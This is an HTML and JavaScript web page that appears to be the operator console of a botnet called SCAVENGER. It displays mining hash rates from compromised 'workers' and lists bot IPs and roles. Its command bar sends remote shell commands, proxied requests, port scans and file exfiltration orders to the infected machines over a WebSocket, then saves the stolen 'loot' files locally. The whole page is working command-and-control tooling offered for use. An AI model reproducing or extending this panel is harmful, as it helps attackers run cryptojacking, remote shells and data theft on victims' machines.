<!DOCTYPE html>
<html>
<head>
    <title>SCAVENGER // OS v4.0</title>
    <style>
        /* --- THEME CONFIG --- */
        :root {
            --bg-color: #050505;
            --term-green: #00ff41;
            --term-dim: #003b0f;
            --alert-red: #ff3333;
            --scanline-color: rgba(0, 0, 0, 0.5);
            --glass-reflection: rgba(255, 255, 255, 0.02);
            --font-main: 'Courier New', monospace;
        }

        /* --- GLOBAL RESET --- */
        body {
            background-color: var(--bg-color);
            margin: 0;
            padding: 20px;
            height: 100vh;
            box-sizing: border-box;
            font-family: var(--font-main);
            color: var(--term-green);
            overflow: hidden;
            display: grid;
            grid-template-rows: auto 1fr auto; /* Header, Main, Footer */
            gap: 15px;
            text-shadow: 0 0 5px var(--term-green); /* The Glow */
        }

        /* --- CRT EFFECT (THE SCREEN) --- */
        body::before {
            content: " ";
            display: block;
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 999;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none; /* Let clicks pass through */
        }

        /* --- LAYOUT CONTAINERS --- */
        .header-bar {
            border-bottom: 2px solid var(--term-green);
            display: flex;
            justify-content: space-between;
            padding-bottom: 5px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .main-deck {
            display: grid;
            grid-template-columns: 300px 1fr; /* Sidebar, Log */
            gap: 15px;
            height: 100%;
            overflow: hidden;
        }

        .panel {
            border: 1px solid var(--term-green);
            background: rgba(0, 20, 0, 0.3);
            display: flex;
            flex-direction: column;
            position: relative;
        }
        
        .panel-header {
            background: var(--term-green);
            color: black;
            padding: 2px 5px;
            font-weight: bold;
            font-size: 12px;
            text-transform: uppercase;
        }

        /* --- SIDEBAR WIDGETS --- */
        .stat-row {
            padding: 10px;
            border-bottom: 1px solid var(--term-dim);
        }
        .stat-big {
            font-size: 32px;
            font-weight: bold;
        }
        
        /* --- AGENT GRID --- */
        .agent-scroll {
            overflow-y: auto;
            flex-grow: 1;
            font-size: 11px;
        }
        table { width: 100%; border-collapse: collapse; }
        td, th { padding: 4px; text-align: left; }
        th { border-bottom: 1px solid var(--term-green); color: var(--term-green); }
        tr:hover { background: var(--term-dim); cursor: crosshair; }
        
        .status-mining { color: #fff; }
        .status-proxy { color: #f0f; text-shadow: 0 0 5px #f0f; }
        .status-idle { color: #555; text-shadow: none; }

        /* --- LOG TERMINAL --- */
        #log-window {
            padding: 10px;
            overflow-y: scroll;
            font-size: 13px;
            flex-grow: 1;
            background: #000;
        }
        .log-entry { margin-bottom: 4px; border-left: 2px solid transparent; padding-left: 5px; }
        .log-entry:hover { border-left: 2px solid var(--term-green); background: #051505; }
        
        /* Scrollbar Styling */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #000; }
        ::-webkit-scrollbar-thumb { background: var(--term-green); border-radius: 0; }

        /* --- COMMAND INPUT --- */
        .input-bar {
            display: flex;
            align-items: center;
            border: 1px solid var(--term-green);
            padding: 10px;
            background: #000;
        }
        .prompt-char { margin-right: 10px; animation: blink 1s infinite; }
        input {
            background: transparent;
            border: none;
            color: var(--term-green);
            font-family: var(--font-main);
            font-size: 16px;
            width: 100%;
            outline: none;
            text-shadow: 0 0 5px var(--term-green);
        }

        /* --- ANIMATIONS --- */
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

        /* --- ASCII ART LOGO --- */
        .ascii-logo {
            white-space: pre;
            font-size: 10px;
            line-height: 8px;
            margin-bottom: 10px;
            color: var(--term-green);
            opacity: 0.5;
        }

        /* --- SPECIAL HIGHLIGHTS --- */
        .glitch-text { animation: blink 0.1s infinite; color: var(--alert-red); }
        a { color: white; text-decoration: none; border-bottom: 1px dotted white; }

    </style>
</head>
<body>

    <div class="header-bar">
        <div>SCAVENGER_NET // v4.0.1 [STABLE]</div>
        <div id="clock">00:00:00 UTC</div>
    </div>

    <div class="main-deck">
        
        <div class="panel">
            <div class="panel-header">:: SYSTEM TELEMETRY ::</div>
            
            <div class="stat-row">
                <div style="font-size: 10px; color: #888;">COMPUTE POWER</div>
                <div id="hashCount" class="stat-big">0.00M</div>
                <div style="font-size: 10px;">H/s (AGGREGATED)</div>
            </div>

            <div class="stat-row">
                <div style="font-size: 10px; color: #888;">CURRENT JOB STATUS</div>
                <div style="background: #111; height: 10px; margin-top: 5px; border: 1px solid var(--term-green); position: relative;">
                    <div id="taskBar" style="background: var(--term-green); width: 0%; height: 100%;"></div>
                </div>
                <div id="percText" style="font-size: 9px; text-align: right; margin-top:2px;">SEARCHING...</div>
            </div>

            <div class="panel-header" style="margin-top: auto;">:: ACTIVE NEURAL LINK ::</div>
            <div class="agent-scroll">
                <table>
                    <thead>
                        <tr>
                            <th>UNIT</th>
                            <th>IP</th>
                            <th>TASK</th>
                        </tr>
                    </thead>
                    <tbody id="workerTable">
                        </tbody>
                </table>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">:: EVENT STREAM (C:\LOGS\MAIN.LOG) ::</div>
            <div id="log-window">
                <div class="ascii-logo">
   _____  ________ __      __  _______  _   __  ________  ______  _____   __
  / ___/ / ____/ // | /| / /  / ___/ / | / / / ____/ / / / __ \/ ___/  / /
  \__ \ / /   / // |/ |/ /  / __/ /  |/ / / / __/ / / / /_/ /\__ \  / / 
 ___/ // /___/ // /|  / /  / /___/ /|  / / /_/ / /_/ / _, _/___/ / /_/  
/____/ \____/_//_/ |_/  /_____/_/ |_/  \____/\____/_/ |_|/____/ (_)   
                </div>
                <div class="log-entry">System Initialized... Waiting for uplink.</div>
            </div>
        </div>

    </div>

    <div class="input-bar">
        <span class="prompt-char">â–ˆ</span>
        <input type="text" id="cmdInput" placeholder="ENTER COMMAND..." autocomplete="off">
    </div>

    <script>
        // --- CLOCK ---
        setInterval(() => {
            document.getElementById('clock').innerText = new Date().toISOString().split('T')[1].split('.')[0] + " UTC";
        }, 1000);

        // --- CORE LOGIC (UNCHANGED) ---
        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
        const wsUrl = protocol + '//' + window.location.host;
        let ws; 
        const logDiv = document.getElementById('log-window');

        function connect() {
            let key = localStorage.getItem('access_key');
            if (!key) {
                key = prompt("AUTHENTICATION REQUIRED // ENTER KEY:");
                if (key) localStorage.setItem('access_key', key);
            }
            
            log("Initializing winsock protocol...");
            ws = new WebSocket(wsUrl + '?key=' + key);

            ws.onopen = () => { 
                log("UPLINK ESTABLISHED. HANDSHAKE COMPLETE."); 
                ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); 
            };
            
            ws.onclose = () => { 
                log("CARRIER SIGNAL LOST. RETRYING IN 3s..."); 
                setTimeout(connect, 3000); 
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if(data.type === 'STATS') updateDashboard(data);
                if(data.type === 'PROXY_LOG') log(`[PROXY] ${data.data.status || 'ERR'} | ${data.data.url || '...'}`);
                if(data.type === 'SHELL_LOG') logHTML(data.output);
                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] ${data.filename}`); downloadFile(data.filename, data.data); }
                if(data.type === 'SNIPE_LOG') { log(`[ALPHA] ${data.data.ticker} :: ${data.data.mentions}`); }
                if(data.type === 'MAP_LOG') handleMapLog(data.data);
                if(data.type === 'SCAN_LOG') handleScanLog(data.data);
            };
        }

        function updateDashboard(data) {
            document.getElementById('hashCount').innerText = (data.totalHashes / 1000000).toFixed(2) + "M";
            
            const tbody = document.getElementById('workerTable'); 
            tbody.innerHTML = '';
            
            data.workers.forEach(w => {
                const row = document.createElement('tr');
                let statusClass = 'status-mining';
                if (w.role === 'PROXYING') statusClass = 'status-proxy';
                if (w.role === 'IDLE') statusClass = 'status-idle';

                row.innerHTML = `
                    <td style="color:#888">${w.id}</td>
                    <td>${w.ip}</td>
                    <td class="${statusClass}">${w.role}</td>
                `;
                tbody.appendChild(row);
            });

            if (data.goldenTicket) {
                document.getElementById('taskBar').style.width = "100%"; 
                document.getElementById('taskBar').style.backgroundColor = "gold";
                document.getElementById('percText').innerText = "TARGET ACQUIRED: " + data.goldenTicket;
                document.getElementById('percText').style.color = "black";
                document.getElementById('percText').style.fontWeight = "bold";
            }
        }

        // --- COMMAND HANDLER ---
        document.getElementById('cmdInput').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') {
                const cmd = this.value; this.value = '';
                
                if (cmd.startsWith('$ ')) ws.send(JSON.stringify({ type: 'SEND_SHELL_CMD', command: cmd.substring(2) }));
                else if (cmd.startsWith('curl ')) ws.send(JSON.stringify({ type: 'SEND_PROXY_CMD', url: cmd.split(' ')[1] }));
                else if (cmd.startsWith('download ')) ws.send(JSON.stringify({ type: 'SEND_EXFIL_CMD', path: cmd.split(' ')[1] }));
                else if (cmd.startsWith('snap ')) ws.send(JSON.stringify({ type: 'SEND_SNAPSHOT_CMD', url: cmd.split(' ')[1] }));
                else if (cmd.startsWith('snipe ')) ws.send(JSON.stringify({ type: 'SEND_SNIPE_CMD', ticker: cmd.split(' ')[1] }));
                else if (cmd.startsWith('map ')) ws.send(JSON.stringify({ type: 'SEND_MAP_CMD', url: cmd.split(' ')[1] }));
                else if (cmd.startsWith('scan ')) ws.send(JSON.stringify({ type: 'SEND_SCAN_CMD', ip: cmd.split(' ')[1] }));
                else if (cmd.startsWith('archive ')) ws.send(JSON.stringify({ type: 'SEND_ARCHIVE_CMD', url: cmd.split(' ')[1] }));
                else log("ERR: UNKNOWN COMMAND SYNTAX.");
            }
        });

        // --- HELPER FUNCTIONS ---
        function downloadFile(filename, base64) {
            const link = document.createElement('a'); link.href = `data:application/octet-stream;base64,${base64}`;
            link.download = filename; document.body.appendChild(link); link.click(); document.body.removeChild(link);
        }

        function log(msg) {
            const line = document.createElement('div'); line.className = 'log-entry';
            line.innerHTML = `<span style="color:#444">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
            logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
        }

        function logHTML(html) {
            const line = document.createElement('div'); line.className = 'log-entry';
            line.innerHTML = `<span style="color:#444">[SHELL]</span> <span style="color:#fff">${html.replace(/\n/g, "<br>")}</span>`;
            logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
        }

        function handleMapLog(res) {
            const color = res.status === 200 ? '#00ff41' : '#ff9900';
            logHTML(`<span style="color:${color}">[MAP] HTTP ${res.status}</span> :: /${res.path}`);
        }

        function handleScanLog(res) {
            logHTML(`<span style="color:#ff3333; font-weight:bold;">[HYDRA] PORT ${res.port} OPEN</span> ON ${res.ip}`);
        }

        connect();
    </script>
</body>
</html>
